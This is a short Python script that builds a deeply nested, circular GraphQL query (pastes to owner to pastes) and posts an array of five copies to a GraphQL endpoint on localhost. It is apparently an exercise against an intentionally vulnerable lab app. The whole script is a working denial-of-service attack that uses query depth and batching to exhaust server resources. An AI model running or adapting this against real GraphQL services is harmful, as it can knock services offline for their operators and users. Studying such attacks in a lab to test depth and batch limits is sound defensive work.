# Array-based Query Batching with Circular Queries

import requests

array_elements = 5
depth = 5
query = {"query":"query {"}
loop_count = 0

for _ in range(depth):
    loop_count += 1
    close_brace = '} ' * depth * 2  + '}'
    payload = "pastes { owner { "
    query["query"] += payload

    if loop_count == depth:
      query["query"] += 'name' + close_brace

print('===========')
print(query)
print('==========')
print('Depth of Query:', depth * 2 + 1)


queries = []
for _ in range(array_elements):
  queries.append(query)

r = requests.post('http://localhost:5013/graphql', json=queries)

print(r.json())
